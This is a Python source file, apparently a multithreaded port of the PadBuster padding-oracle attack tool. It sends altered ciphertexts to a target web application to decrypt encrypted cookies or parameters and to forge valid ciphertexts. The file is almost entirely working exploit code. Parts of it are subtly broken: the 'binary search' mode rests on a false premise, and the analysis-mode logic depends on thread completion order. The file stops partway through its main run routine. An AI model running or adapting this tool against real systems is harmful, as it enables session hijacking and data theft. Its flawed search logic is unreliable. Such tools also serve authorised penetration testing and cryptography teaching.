#!/usr/bin/env python3
"""
PadBuster.py - Automated script for performing Padding Oracle attacks
Python implementation of the original PadBuster Perl script with multithreading
and performance optimizations.

Original credits to Brian Holyfield - Gotham Digital Science (labs@gdssecurity.com)
J.Rizzo and T.Duong for providing proof of concept web exploit techniques 
S.Vaudenay for initial discovery of the attack
"""

import argparse
import base64
import binascii
import re
import time
import urllib.parse
import sys
import concurrent.futures
import pickle
import os
import json
from typing import Tuple, Dict, List, Optional, Union, Any, Callable
from dataclasses import dataclass

# Fix for urllib3.packages.six.moves error
try:
    import requests
    from requests.adapters import HTTPAdapter
except ImportError as e:
    if "urllib3.packages.six.moves" in str(e):
        print("Fixing dependency issue...")
        # Install or update the six package
        import subprocess
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "six"])
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "urllib3<2.0.0"])
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "tqdm"])
        # Now try to import requests again
        import requests
        from requests.adapters import HTTPAdapter
    else:
        print(f"Error importing requests: {e}")
        print("Try running: pip install requests six urllib3==1.26.15 tqdm")
        sys.exit(1)

try:
    from tqdm import tqdm
    tqdm_available = True
except ImportError:
    tqdm_available = False


@dataclass
class PadBusterConfig:
    url: str
    encrypted_sample: str
    block_size: int
    error_string: Optional[str] = None
    encoding: int = 0  # 0=Base64, 1=Lower HEX, 2=Upper HEX, 3=.NET UrlToken, 4=WebSafe Base64
    post_data: Optional[str] = None
    cookies: Optional[str] = None
    headers: Optional[str] = None
    prefix: Optional[str] = None
    intermediary_input: Optional[str] = None
    cipher_input: Optional[str] = None
    plaintext_input: Optional[bytes] = None
    encoded_plaintext_input: Optional[str] = None
    no_encode: bool = False
    very_verbose: bool = False
    proxy: Optional[str] = None
    proxy_auth: Optional[str] = None
    no_iv: bool = False
    auth: Optional[str] = None
    resume_block: Optional[int] = None
    interactive: bool = False
    brute_force: bool = False
    ignore_content: bool = False
    use_body: bool = False
    verbose: bool = False
    log: bool = False
    max_threads: int = 10  # Default number of threads for parallel requests
    search_method: str = "linear"  # linear or binary
    save_state: bool = False  # Save intermediate state
    resume_file: Optional[str] = None  # File to resume from
    timeout: int = 10  # Request timeout in seconds
    connection_pool_size: int = 20  # Connection pool size
    smart_retry: bool = True  # Smart retry based on response patterns
    progress_bar: bool = True  # Display progress bar


class PadBuster:
    def __init__(self, config: PadBusterConfig):
        self.config = config
        self.method = "POST" if config.post_data else "GET"
        self.total_requests = 0
        self.request_tracker = 0
        self.time_tracker = 0
        self.print_stats = False
        self.encrypted_bytes = None
        self.plain_text_bytes = b""
        self.forged_bytes = None
        self.iv_bytes = None
        self.was_sample_found = False
        self.oracle_signature = ""
        self.oracle_candidates = []
        self.oracle_guesses = {}
        self.response_file_buffer = {}
        self.block_count = 0
        self.progress_bar = None
        self.response_cache = {}  # Cache for HTTP responses
        self.state = {
            "decrypted_blocks": {},
            "intermediary_blocks": {},
            "current_block": 0,
            "current_byte": 0,
            "config": vars(config)
        }
        
        # Initialize progress bar if enabled
        if config.progress_bar:
            self.enable_progress_bar()
        
        # Try to resume from file if specified
        if config.resume_file and os.path.exists(config.resume_file):
            self.load_state(config.resume_file)
            print(f"Resuming from state file: {config.resume_file}")
        
        # Configure requests session with connection pooling
        self.session = requests.Session()
        adapter = HTTPAdapter(
            pool_connections=config.connection_pool_size,
            pool_maxsize=config.connection_pool_size,
            max_retries=3
        )
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)
        
        if config.proxy:
            proxies = {
                "http": f"http://{config.proxy}",
                "https": f"http://{config.proxy}"
            }
            self.session.proxies.update(proxies)
            
        if config.proxy_auth:
            proxy_user, proxy_pass = config.proxy_auth.split(":")
            self.session.proxies = {
                "http": f"http://{proxy_user}:{proxy_pass}@{config.proxy}",
                "https": f"http://{proxy_user}:{proxy_pass}@{config.proxy}"
            }
            
        if config.auth:
            auth_user, auth_pass = config.auth.split(":")
            self.session.auth = (auth_user, auth_pass)
        
        # Process custom headers
        self.custom_headers = {}
        if config.headers:
            for header in config.headers.split(';'):
                name, value = header.split('::')
                self.custom_headers[name] = value
                
        # Initialize encrypted bytes
        self.prepare_encrypted_bytes()
        
    def enable_progress_bar(self):
        """Initialize progress bar for user feedback"""
        global tqdm_available
        if not tqdm_available:
            try:
                from tqdm import tqdm
                tqdm_available = True
            except ImportError:
                tqdm_available = False
                print("Warning: tqdm not available. Install with 'pip install tqdm' for progress bars.")
    
    def save_state(self, filename: Optional[str] = None):
        """Save current state to file for resuming later"""
        if not self.config.save_state and not filename:
            return
            
        # Update the state
        self.state.update({
            "decrypted_blocks": {i: self.my_encode(block, 1) for i, block in enumerate(self.plain_text_bytes)},
            "oracle_signature": self.oracle_signature,
            "total_requests": self.total_requests,
            "block_count": self.block_count
        })
        
        # Create a filename if not provided
        if not filename:
            timestamp = time.strftime("%Y%m%d-%H%M%S")
            filename = f"padbuster_state_{timestamp}.json"
        
        with open(filename, 'w') as f:
            json.dump(self.state, f, indent=4)
            
        self.my_print(f"[+] State saved to {filename}", 0)
        
    def load_state(self, filename: str):
        """Load saved state from file"""
        try:
            with open(filename, 'r') as f:
                self.state = json.load(f)
                
            # Restore config settings from state
            for key, value in self.state.get("config", {}).items():
                if hasattr(self.config, key):
                    setattr(self.config, key, value)
                    
            # Restore decrypted blocks
            if "decrypted_blocks" in self.state:
                blocks = {}
                for idx, block_hex in self.state["decrypted_blocks"].items():
                    blocks[int(idx)] = self.my_decode(block_hex, 1)
                
                # Reconstruct plain_text_bytes
                sorted_indices = sorted([int(i) for i in blocks.keys()])
                self.plain_text_bytes = b''.join([blocks[i] for i in sorted_indices])
            
            # Restore other state variables
            if "oracle_signature" in self.state:
                self.oracle_signature = self.state["oracle_signature"]
            
            if "total_requests" in self.state:
                self.total_requests = self.state["total_requests"]
                
            if "block_count" in self.state:
                self.block_count = self.state["block_count"]
                
            self.my_print(f"[+] State loaded from {filename}", 0)
            return True
            
        except (json.JSONDecodeError, FileNotFoundError, KeyError) as e:
            self.my_print(f"[!] Error loading state: {str(e)}", 0)
            return False
    
    def prepare_encrypted_bytes(self):
        """Initialize and prepare the encrypted sample for processing"""
        encrypted_bytes = self.config.encrypted_sample
        
        # URL decode if necessary
        if '%' in encrypted_bytes:
            encrypted_bytes = urllib.parse.unquote(encrypted_bytes)
            
        # Decode based on the specified encoding format
        self.encrypted_bytes = self.my_decode(encrypted_bytes, self.config.encoding)
        
        # Check if encrypted bytes length is divisible by block size
        if len(self.encrypted_bytes) % self.config.block_size != 0:
            print(f"\nERROR: Encrypted Bytes must be evenly divisible by Block Size ({self.config.block_size})")
            print(f"       Encrypted sample length is {len(self.encrypted_bytes)}. Double check the Encoding and Block Size.")
            sys.exit(1)
            
        # If no IV option is set, prepend nulls as the IV (only if decrypting)
        if self.config.no_iv and not self.config.brute_force and not self.config.plaintext_input:
            self.encrypted_bytes = b"\x00" * self.config.block_size + self.encrypted_bytes
            
        # Isolate the IV into a separate byte array
        self.iv_bytes = self.encrypted_bytes[:self.config.block_size]
        
        # Calculate block count
        self.block_count = len(self.encrypted_bytes) // self.config.block_size
        
        # Check for minimum blocks required
        if not self.config.brute_force and not self.config.plaintext_input and self.block_count < 2:
            print("\nERROR: There is only one block. Try again using the -noiv option.")
            sys.exit(1)
            
    def my_decode(self, data: str, format_type: int) -> bytes:
        """Decode data based on specified format"""
        if format_type == 1 or format_type == 2:  # HEX (lower or upper)
            # Always convert to lower when decoding
            return binascii.unhexlify(data.lower())
        elif format_type == 3:  # .NET UrlToken
            return self.web64_decode(data, net=True)
        elif format_type == 4:  # WebSafe Base64
            return self.web64_decode(data, net=False)
        else:  # Default to Base64
            return base64.b64decode(data)
    
    def my_encode(self, data: bytes, format_type: int) -> str:
        """Encode data based on specified format"""
        if format_type == 1:  # HEX lower
            return binascii.hexlify(data).decode('ascii').lower()
        elif format_type == 2:  # HEX upper
            return binascii.hexlify(data).decode('ascii').upper()
        elif format_type == 3:  # .NET UrlToken
            return self.web64_encode(data, net=True)
        elif format_type == 4:  # WebSafe Base64
            return self.web64_encode(data, net=False)
        else:  # Default to Base64
            return base64.b64encode(data).decode('ascii')
    
    def web64_encode(self, data: bytes, net: bool) -> str:
        """Encode data using web-safe base64 encoding"""
        # Encode using base64 and replace standard chars with web-safe
        encoded = base64.b64encode(data).decode('ascii')
        encoded = encoded.replace('+', '-').replace('/', '_')
        
        # Handle padding for .NET UrlToken encoding
        if net:
            # Count and remove padding characters
            count = encoded.count('=')
            encoded = encoded.replace('=', '')
            encoded += str(count)
        else:
            encoded = encoded.replace('=', '')
            
        return encoded
    
    def web64_decode(self, data: str, net: bool) -> bytes:
        """Decode data from web-safe base64 encoding"""
        # Replace web-safe chars with standard base64 chars
        data = data.replace('-', '+').replace('_', '/')
        
        # Handle padding for .NET UrlToken encoding
        if net:
            # Extract and remove padding count
            count = int(data[-1])
            data = data[:-1] + ('=' * count)
        
        # Add padding if necessary
        while len(data) % 4 != 0:
            data += '='
            
        return base64.b64decode(data)
    
    def make_request(self, method: str, url: str, data: Optional[str] = None, 
                    cookies: Optional[str] = None) -> Tuple[int, str, str, int]:
        """Make an HTTP request and return the response details with caching"""
        
        # Create a cache key based on the request parameters
        cache_key = f"{method}:{url}:{data}:{cookies}"
        
        # Check if this request is in the cache
        if cache_key in self.response_cache:
            self.my_print("Using cached response", 2)
            return self.response_cache[cache_key]
        
        num_retries = 0
        data = data or ''
        cookies_dict = {}
        
        # Parse cookies string into dictionary
        if cookies:
            for cookie in cookies.split('; '):
                if '=' in cookie:
                    name, value = cookie.split('=', 1)
                    cookies_dict[name] = value
        
        self.request_tracker += 1
        
        # Smart backoff parameters
        retry_delay = 1  # Start with 1 second
        max_delay = 10   # Maximum delay
        
        while num_retries < 15:
            try:
                headers = self.custom_headers.copy()
                
                if self.config.very_verbose:
                    self.my_print(f"Request:\n{method}\n{url}\n{data}\n{cookies}", 0)
                
                start_time = time.time()
                
                if method == "POST":
                    headers['Content-Type'] = 'application/x-www-form-urlencoded'
                    response = self.session.post(url, data=data, cookies=cookies_dict, 
                                               headers=headers, allow_redirects=False,
                                               timeout=self.config.timeout)
                else:
                    response = self.session.get(url, cookies=cookies_dict, 
                                              headers=headers, allow_redirects=False,
                                              timeout=self.config.timeout)
                
                end_time = time.time()
                self.time_tracker += (end_time - start_time)
                
                if self.print_stats == 1 and self.request_tracker % 250 == 0:
                    print(f"[+] {self.request_tracker} Requests Issued (Avg Request Time: {self.time_tracker/250:.3f})")
                    self.time_tracker = 0
                
                # Extract response details
                status = response.status_code
                content = response.text
                location = response.headers.get('Location', 'N/A')
                content_length = len(content)
                
                if self.config.very_verbose:
                    self.my_print(f"Response Content:\n{content}", 0)
                
                self.total_requests += 1
                
                # Store in cache
                result = (status, content, location, content_length)
                self.response_cache[cache_key] = result
                
                return result
                
            except requests.exceptions.RequestException as e:
                error_msg = str(e)
                print(f"ERROR: {error_msg}")
                
                # Implement smart retry with exponential backoff
                if self.config.smart_retry:
                    # Different delays based on error type
                    if "ConnectionError" in error_msg or "ConnectTimeout" in error_msg:
                        # Connection issues might need longer waits
                        retry_delay = min(retry_delay * 2, max_delay)
                    elif "ReadTimeout" in error_msg:
                        # Server is processing but slow, slightly longer wait
                        retry_delay = min(retry_delay * 1.5, max_delay)
                    else:
                        # Other errors, standard backoff
                        retry_delay = min(retry_delay * 1.2, max_delay)
                else:
                    # Fixed retry delay
                    retry_delay = 5
                
                print(f"   Retrying in {retry_delay:.1f} seconds... (Attempt {num_retries+1}/15)")
                num_retries += 1
                time.sleep(retry_delay)
        
        print("ERROR: Number of retries has exceeded 15 attempts...quitting.")
        sys.exit(1)
    
    def prep_request(self, url: str, post_data: Optional[str], cookies: Optional[str], 
                   sample: str, test_bytes: str) -> Tuple[str, str, str]:
        """Prepare the request by replacing the sample with test bytes"""
        test_url = url
        was_sample_found = False
        
        # Escape special regex characters in sample
        escaped_sample = re.escape(sample)
        
        if re.search(escaped_sample, url):
            test_url = re.sub(escaped_sample, test_bytes, url)
            was_sample_found = True
        
        test_post = ""
        if post_data:
            test_post = post_data
            if re.search(escaped_sample, post_data):
                test_post = re.sub(escaped_sample, test_bytes, post_data)
                was_sample_found = True
        
        test_cookies = ""
        if cookies:
            test_cookies = cookies
            if re.search(escaped_sample, cookies):
                test_cookies = re.sub(escaped_sample, test_bytes, cookies)
                was_sample_found = True
        
        if not was_sample_found:
            print("ERROR: Encrypted sample was not found in the test request")
            sys.exit(1)
            
        return test_url, test_post, test_cookies
    
    def test_single_byte(self, test_bytes: bytearray, byte_num: int, byte_value: int, 
                      sample_bytes: bytes, analysis_mode: int) -> Dict[str, Any]:
        """Test a single byte value and return the results"""
        # Make a copy to avoid modifying the original
        test_bytes_copy = bytearray(test_bytes)
        test_bytes_copy[byte_num] = byte_value
        
        # Combine the test bytes and the sample
        combined_test_bytes = bytes(test_bytes_copy) + sample_bytes
        
        if self.config.prefix:
            prefix_bytes = self.my_decode(self.config.prefix, self.config.encoding)
            combined_test_bytes = prefix_bytes + combined_test_bytes
        
        # Encode the combined test bytes
        encoded_test_bytes = self.my_encode(combined_test_bytes, self.config.encoding)
        
        # URL encode if needed
        if not self.config.no_encode:
            encoded_test_bytes = urllib.parse.quote(encoded_test_bytes)
        
        # Prepare the request
        test_url, test_post, test_cookies = self.prep_request(
            self.config.url, 
            self.config.post_data, 
            self.config.cookies, 
            self.config.encrypted_sample, 
            encoded_test_bytes
        )
        
        # Make the request
        status, content, location, content_length = self.make_request(
            self.method, test_url, test_post, test_cookies
        )
        
        # Build the signature data
        signature_data = f"{status}\t{content_length}\t{location}"
        if self.config.use_body:
            signature_data += f"\t{content}"
        
        # Return all the data we need for analysis
        return {
            "byte_value": byte_value,
            "test_bytes": test_bytes_copy,
            "signature_data": signature_data,
            "status": status,
            "content": content,
            "location": location,
            "content_length": content_length,
            "test_url": test_url,
            "test_post": test_post,
            "test_cookies": test_cookies
        }
    
    def binary_search_padding_byte(self, test_bytes: bytearray, byte_num: int, 
                               sample_bytes: bytes) -> Optional[int]:
        """Use binary search to find the correct padding byte"""
        left, right = 0, 255
        
        while left <= right:
            mid = (left + right) // 2
            
            # Test the middle value
            result = self.test_single_byte(test_bytes, byte_num, mid, sample_bytes, 1)
            signature_data = result["signature_data"]
            
            # Check if we found a padding oracle
            oracle_found = False
            if self.config.error_string and self.config.error_string not in result["content"]:
                oracle_found = True
            elif self.oracle_signature and self.oracle_signature != signature_data:
                oracle_found = True
                
            if oracle_found:
                # Success! We found a valid padding byte
                return mid
            
            # If no success, we need to search in one of the halves
            # This approach assumes that valid padding bytes are clustered
            # We'll try a probe on either side to determine direction
            
            if mid > 0:
                # Test a lower value
                lower_result = self.test_single_byte(test_bytes, byte_num, mid-1, sample_bytes, 1)
                lower_sig = lower_result["signature_data"]
                lower_oracle_found = False
                
                if self.config.error_string and self.config.error_string not in lower_result["content"]:
                    lower_oracle_found = True
                elif self.oracle_signature and self.oracle_signature != lower_sig:
                    lower_oracle_found = True
                    
                if lower_oracle_found:
                    # Valid values are likely in lower half
                    right = mid - 1
                    continue
            
            if mid < 255:
                # Test a higher value
                higher_result = self.test_single_byte(test_bytes, byte_num, mid+1, sample_bytes, 1)
                higher_sig = higher_result["signature_data"]
                higher_oracle_found = False
                
                if self.config.error_string and self.config.error_string not in higher_result["content"]:
                    higher_oracle_found = True
                elif self.oracle_signature and self.oracle_signature != higher_sig:
                    higher_oracle_found = True
                    
                if higher_oracle_found:
                    # Valid values are likely in upper half
                    left = mid + 1
                    continue
            
            # If we got here, neither direction showed promise
            # Divide the search space randomly to avoid getting stuck in patterns
            if mid < 128:
                left = mid + 1
            else:
                right = mid - 1
                
        return None  # No valid padding byte found
    
    def determine_signature(self): 
        """Help the user detect the oracle response if an error string was not provided"""
        # Sort guesses by frequency (least to most common)
        sorted_guesses = sorted(self.oracle_guesses.keys(), key=lambda x: self.oracle_guesses[x])
        
        print("The following response signatures were returned:")
        print("-------------------------------------------------------")
        if self.config.use_body:
            print("ID#\tFreq\tStatus\tLength\tChksum\tLocation")
        else:
            print("ID#\tFreq\tStatus\tLength\tLocation")
        print("-------------------------------------------------------")
        
        for i, sig in enumerate(sorted_guesses, 1):
            line = f"{i}"
            if i == len(sorted_guesses) and len(sorted_guesses) > 1:
                line += " **"
                
            sig_fields = sig.split("\t")
            line += f"\t{self.oracle_guesses[sig]}\t{sig_fields[0]}\t{sig_fields[1]}"
            
            if self.config.use_body and len(sig_fields) > 3:
                # Calculate a simple checksum for the content
                checksum = sum(ord(c) for c in sig_fields[3]) % 0xFFFFFFFF
                line += f"\t{checksum}"
                
            line += f"\t{sig_fields[2]}"
            print(line)
            
            # Write to log file if enabled
            if self.config.log:
                self.write_file(f"Response_Analysis_Signature_{i}.txt", self.response_file_buffer[sig])
        
        print("-------------------------------------------------------")
        
        if len(sorted_guesses) == 1 and not self.config.brute_force:
            print("\nERROR: All of the responses were identical.")
            print("Double check the Block Size and try again.")
            sys.exit(1)
        else:
            recommended = len(sorted_guesses)
            response_num = int(input(f"\nEnter an ID that matches the error condition\nNOTE: The ID# marked with ** is recommended: ") or recommended)
            print(f"\nContinuing test with selection {response_num}\n")
            self.oracle_signature = sorted_guesses[response_num-1]
    
    def process_block(self, sample_bytes: bytes) -> bytes:
        """Process a block to determine intermediate bytes using the configured search method"""
        if self.config.search_method == "binary":
            return self.process_block_binary_search(sample_bytes)
        else:
            return self.process_block_linear_search(sample_bytes)
            
    def process_block_linear_search(self, sample_bytes: bytes) -> bytes:
        """Process a block using linear search (testing all byte values)"""
        # Analysis mode is either 0 (response analysis) or 1 (exploit)
        analysis_mode = 0 if not self.config.error_string and not self.oracle_signature else 1
        
        complete = False
        auto_retry = False
        has_hit = False
        
        while not complete:
            # Reset the return value
            return_value = b""
            
            repeat = False
            
            # TestBytes are the fake bytes prepended to the cipher test for the padding attack
            test_bytes = bytearray(b"\x00" * self.config.block_size)
            
            false_positive_detector = 0
            
            # Work on one byte at a time, starting with the last byte and moving backwards
            byte_num = self.config.block_size - 1
            
            # Create progress bar if enabled
            if self.config.progress_bar and tqdm_available:
                progress_bar = tqdm(total=self.config.block_size, desc="Processing block", unit="byte")
            else:
                progress_bar = None
                
            while byte_num >= 0:
                # For each byte position, we'll test all 256 possible values in parallel
                byte_values_to_test = list(range(256))
                if analysis_mode == 0 and byte_num == self.config.block_size - 1:
                    # In analysis mode for the first byte, announce what we're doing
                    self.my_print("INFO: No error string was provided...starting response analysis\n", 0)
                
                # Use thread pool to parallelize requests
                found_match = False
                batch_size = min(self.config.max_threads, len(byte_values_to_test))
                
                with concurrent.futures.ThreadPoolExecutor(max_workers=batch_size) as executor:
                    # Submit all the test cases
                    future_to_value = {
                        executor.submit(self.test_single_byte, test_bytes, byte_num, value, sample_bytes, analysis_mode): value
                        for value in byte_values_to_test
                    }
                    
                    # Process them as they complete
                    for future in concurrent.futures.as_completed(future_to_value):
                        result = future.result()
                        byte_value = result["byte_value"]
                        signature_data = result["signature_data"]
                        
                        # If in analysis mode, collect the results
                        if analysis_mode == 0:
                            self.oracle_guesses[signature_data] = self.oracle_guesses.get(signature_data, 0) + 1
                            
                            self.response_file_buffer[signature_data] = (
                                f"URL: {result['test_url']}\nPost Data: {result['test_post']}\n"
                                f"Cookies: {result['test_cookies']}\n\nStatus: {result['status']}\n"
                                f"Location: {result['location']}\nContent-Length: {result['content_length']}\n"
                                f"Content:\n{result['content']}"
                            )
                            
                            # If we've completed all tests for the first byte in analysis mode
                            if byte_num == self.config.block_size - 1 and byte_value == 0 and len(self.oracle_guesses) > 0:
                                self.my_print("*** Response Analysis Complete ***\n", 0)
                                self.determine_signature()
                                analysis_mode = 1
                                repeat = True
                                byte_num = -1  # Exit outer loop
                                found_match = True
                                break
                        else:
                            # Check if we found a padding oracle
                            oracle_found = False
                            if self.config.error_string and self.config.error_string not in result["content"]:
                                oracle_found = True
                            elif self.oracle_signature and self.oracle_signature != signature_data:
                                oracle_found = True
                                
                            if oracle_found:
                                # Auto-retry logic for the first byte
                                if auto_retry and byte_num == (self.config.block_size - 1) and not has_hit:
                                    has_hit = True
                                    continue
                                
                                # If there was no padding error, then it worked
                                self.my_print(f"[+] Success: ({abs(byte_value-256)}/256) [Byte {byte_num+1}]", 0)
                                self.my_print(f"[+] Test Byte: {urllib.parse.quote(bytes([byte_value]))}", 
                                             1 if self.config.verbose else 0)
                                
                                # Check for potential false positives
                                if byte_value == 255:
                                    false_positive_detector += 1
                                
                                continue_val = "y"
                                if self.config.interactive:
                                    continue_val = input(
                                        "Do you want to use this value (Yes/No/All)? [y/n/a]: "
                                    ).lower()
                                
                                if continue_val in ["y", "a"]:
                                    if continue_val == "a":
                                        self.config.interactive = False
                                    
                                    # Update our test bytes with the successful value
                                    test_bytes = bytearray(result["test_bytes"])
                                    
                                    # Calculate the decrypted byte by XORing with the padding value
                                    current_padding_byte = self.config.block_size - byte_num
                                    next_padding_byte = current_padding_byte + 1
                                    
                                    # XOR the test byte with the current padding value
                                    decrypted_byte = bytes([test_bytes[byte_num] ^ current_padding_byte])
                                    self.my_print(
                                        f"[+] XORing with Padding Char, which is {urllib.parse.quote(bytes([current_padding_byte]))}",
                                        1 if self.config.verbose else 0
                                    )
                                    
                                    return_value = decrypted_byte + return_value
                                    self.my_print(
                                        f"[+] Decrypted Byte is: {urllib.parse.quote(decrypted_byte)}",
                                        1 if self.config.verbose else 0
                                    )
                                    
                                    # Update test bytes for the next round based on the padding
                                    for k in range(byte_num, self.config.block_size):
                                        # XOR with current padding to recover the decrypted byte
                                        test_bytes[k] ^= current_padding_byte
                                        # XOR with next padding value
                                        test_bytes[k] ^= next_padding_byte
                                    
                                    found_match = True
                                    break
                    
                    # If no match was found and we've tested all values
                    if not found_match and analysis_mode == 1:
                        self.my_print(f"ERROR: No matching response on [Byte {byte_num+1}]", 0)
                        
                        if not auto_retry:
                            auto_retry = True
                            self.my_print("       Automatically trying one more time...", 0)
                            repeat = True
                            byte_num = -1  # Exit outer loop
                            break
                        else:
                            if byte_num == self.config.block_size - 1 and self.config.error_string:
                                self.my_print("\nAre you sure you specified the correct error string?", 0)
                                self.my_print("Try re-running without the -error option to perform a response analysis.\n", 0)
                            
                            continue_val = input("Do you want to start this block over? (Yes/No)? [y/n]: ").lower()
                            if continue_val != "n":
                                self.my_print("INFO: Switching to interactive mode", 0)
                                self.config.interactive = True
                                repeat = True
                                byte_num = -1  # Exit outer loop
                                break
                
                # Check for false positive detection
                if false_positive_detector == self.config.block_size:
                    self.my_print("\n*** ERROR: It appears there are false positive results. ***\n", 0)
                    self.my_print("HINT: The most likely cause for this is an incorrect error string.\n", 0)
                    
                    if self.config.error_string:
                        self.my_print("[+] Check the error string you provided and try again, or consider running", 0)
                        self.my_print("[+] without an error string to perform an automated response analysis.\n", 0)
                    else:
                        self.my_print("[+] You may want to consider defining a custom padding error string", 0)
                        self.my_print("[+] instead of the automated response analysis.\n", 0)
                    
                    continue_val = input("Do you want to start this block over? (Yes/No)? [y/n]: ").lower()
                    if continue_val == "y":
                        self.my_print("INFO: Switching to interactive mode", 0)
                        self.config.interactive = True
                        repeat = True
                        byte_num = -1  # Exit outer loop
                        break
                
                # Move to the next byte if we found a match
                if found_match:
                    byte_num -= 1
                    # Update progress bar
                    if progress_bar:
                        progress_bar.update(1)
                
                # If we exited the inner loop early, we might need to break out of the outer loop too
                if byte_num < 0:
                    break
            
            # Close progress bar
            if progress_bar:
                progress_bar.close()
                
            # Save intermediate state if enabled
            if self.config.save_state:
                self.save_state()
                
            # If repeat is True, we need to try again
            if repeat:
                complete = False
            else:
                complete = True
                
        return return_value
    
    def decrypt_mode(self):
        """Run in decrypt mode to break the encryption with progress visualization"""
        self.my_print("INFO: Starting PadBuster Decrypt Mode", 0)
        
        if self.config.resume_block:
            self.my_print(f"INFO: Resuming previous exploit at Block {self.config.resume_block}\n", 0)
            resume_block = self.config.resume_block
        else:
            resume_block = 1
        
        # Create overall progress bar for all blocks if enabled
        if self.config.progress_bar and tqdm_available:
            try:
                total_blocks = self.block_count - resume_block
                blocks_progress = tqdm(total=total_blocks, desc="Total progress", unit="block")
            except ImportError:
                blocks_progress = None
        else:
            blocks_progress = None
        
        # Process each block (starting from resume_block+1 because first block is IV)
        for block_num in range(resume_block + 1, self.block_count + 1):
            self.my_print(f"*** Starting Block {block_num-1} of {self.block_count-1} ***\n", 0)
            
            # Update the state information
            self.state["current_block"] = block_num - 1
            
            # Get the current cipher block
            sample_bytes = self.encrypted_bytes[block_num * self.config.block_size - self.config.block_size:
                                              block_num * self.config.block_size]
            
            # Process the block to get intermediate bytes
            intermediary_bytes = self.process_block(sample_bytes)
            
            # Save intermediary bytes in the state
            self.state["intermediary_blocks"][str(block_num-1)] = self.my_encode(intermediary_bytes, 1)
            
            # Decrypt by XORing with previous block (or IV if first block)
            if block_num == 2:
                decrypted_bytes = bytes(a ^ b for a, b in zip(intermediary_bytes, self.iv_bytes))
            else:
                prev_block = self.encrypted_bytes[(block_num - 2) * self.config.block_size:
                                                (block_num - 1) * self.config.block_size]
                decrypted_bytes = bytes(a ^ b for a, b in zip(intermediary_bytes, prev_block))
            
            self.my_print(f"\nBlock {block_num-1} Results:", 0)
            self.my_print(f"[+] Cipher Text (HEX): {self.my_encode(sample_bytes, 1)}", 0)
            self.my_print(f"[+] Intermediate Bytes (HEX): {self.my_encode(intermediary_bytes, 1)}", 0)
            self.my_print(f"[+] Plain Text: {decrypted_bytes.decode('latin1', errors='replace')}\n", 0)
            
            # Add to the plaintext result
            self.plain_text_bytes += decrypted_bytes
            
            # Save the current state if requested
            if self.config.save_state:
                self.save_state()
                
            # Update progress bar
            if blocks_progress:
                blocks_progress.update(1)
        
        # Close progress bar
        if blocks_progress:
            blocks_progress.close()
    
    def encrypt_mode(self):
        """Run in encrypt mode to create a forged ciphertext"""
        self.my_print("INFO: Starting PadBuster Encrypt Mode", 0)
        
        # Prepare the plaintext with padding
        plaintext_input = self.config.plaintext_input
        if self.config.encoded_plaintext_input:
            plaintext_input = self.my_decode(self.config.encoded_plaintext_input, self.config.encoding)
        
        # Calculate the number of blocks needed
        block_count = (len(plaintext_input) + 1 + self.config.block_size - 1) // self.config.block_size
        self.my_print(f"[+] Number of Blocks: {block_count}\n", 0)
        
        # Add PKCS#7 padding
        pad_count = (self.config.block_size * block_count) - len(plaintext_input)
        plaintext_input = plaintext_input + bytes([pad_count] * pad_count)
        
        # Initialize the forged bytes
        if self.config.cipher_input:
            self.forged_bytes = self.my_decode(self.config.cipher_input, 1)
        else:
            self.forged_bytes = b"\x00" * self.config.block_size
            
        sample_bytes = self.forged_bytes
        
        # Create progress bar if enabled
        if self.config.progress_bar and tqdm_available:
            encrypt_progress = tqdm(total=block_count, desc="Encrypting", unit="block")
        else:
            encrypt_progress = None
        
        # Process each block, starting from the last one
        for block_num in range(block_count, 0, -1):
            # Get intermediate bytes
            if self.config.intermediary_input and block_num == block_count:
                intermediary_bytes = self.my_decode(self.config.intermediary_input, 1)
            else:
                intermediary_bytes = self.process_block(sample_bytes)
            
            # XOR intermediate bytes with plaintext to get the previous block
            block_start = (block_num - 1) * self.config.block_size
            block_end = block_num * self.config.block_size
            plaintext_block = plaintext_input[block_start:block_end]
            
            sample_bytes = bytes(a ^ b for a, b in zip(intermediary_bytes, plaintext_block))
            self.forged_bytes = sample_bytes + self.forged_bytes
            
            self.my_print(f"\nBlock {block_num} Results:", 0)
            self.my_print(f"[+] New Cipher Text (HEX): {self.my_encode(sample_bytes, 1)}", 0)
            self.my_print(f"[+] Intermediate Bytes (HEX): {self.my_encode(intermediary_bytes, 1)}\n", 0)
            
            # Save state if enabled
            if self.config.save_state:
                self.save_state()
                
            # Update progress bar
            if encrypt_progress:
                encrypt_progress.update(1)
        
        # Close progress bar
        if encrypt_progress:
            encrypt_progress.close()
        
        # Encode the final result
        self.forged_bytes = self.my_encode(self.forged_bytes, self.config.encoding)
    
    def brute_force_mode(self):
        """Run in brute force mode to find valid encryption values"""
        self.my_print("INFO: Starting PadBuster Brute Force Mode", 0)
        self.my_print("Brute force mode is not fully implemented in this version", 0)
        self.my_print("Consider using decrypt mode with a modified sample", 0)
    
    def my_print(self, print_data: str, print_level: int):
        """Print message based on verbosity level and log if enabled"""
        if (self.config.verbose and print_level > 0) or print_level < 1 or self.config.very_verbose:
            print(print_data)
            if self.config.log:
                self.write_file("ActivityLog.txt", print_data + "\n")
    
    def write_file(self, file_name: str, file_content: str):
        """Write data to a log file if logging is enabled"""
        if self.config.log:
            import os
            from datetime import datetime
            
            # Create directory with timestamp if it doesn't exist
            dir_name = f"PadBuster.{datetime.now().strftime('%d%b%y')}"
            if not os.path.exists(dir_name):
                os.makedirs(dir_name)
                
            # Write to file
            with open(os.path.join(dir_name, file_name), 'a') as f:
                f.write(file_content)
    
    def run(self):
        """Main execution flow of the PadBuster tool"""
        print("\n+-------------------------------------------+")
        print("| PadBuster.py - Python Padding Oracle Tool |")
        print("| Based on PadBuster v0.3.3 by B. Holyfield |")
        print("| Parallelized with up to", self.config.max_threads, "threads |")
        print("+-------------------------------------------+")
        
        # First, test the original request
        status, content, location, content_length = self.make_request(
            self.method, self.config.url, self.config.post_data, self.config.cookies
        )
        
        self.my_print("\nINFO: The original request returned the following", 0)
        self.my_print(f"[+] Status: {status}", 0)
        self.my_print(f"[+] Location: {location}", 0)
        self.my_print(f"[+] Content Length: {content_length}\n", 0)
        self.my_print(f"[+] Response: {content}\n", 1 if self.config.verbose else 0)
        
        # Display search method being used
        if self.config.search_method == "binary":
            self.my_print("INFO: Using binary search method for faster execution", 0)
        else:
            self.my_print("INFO: Using linear search method", 0)
            
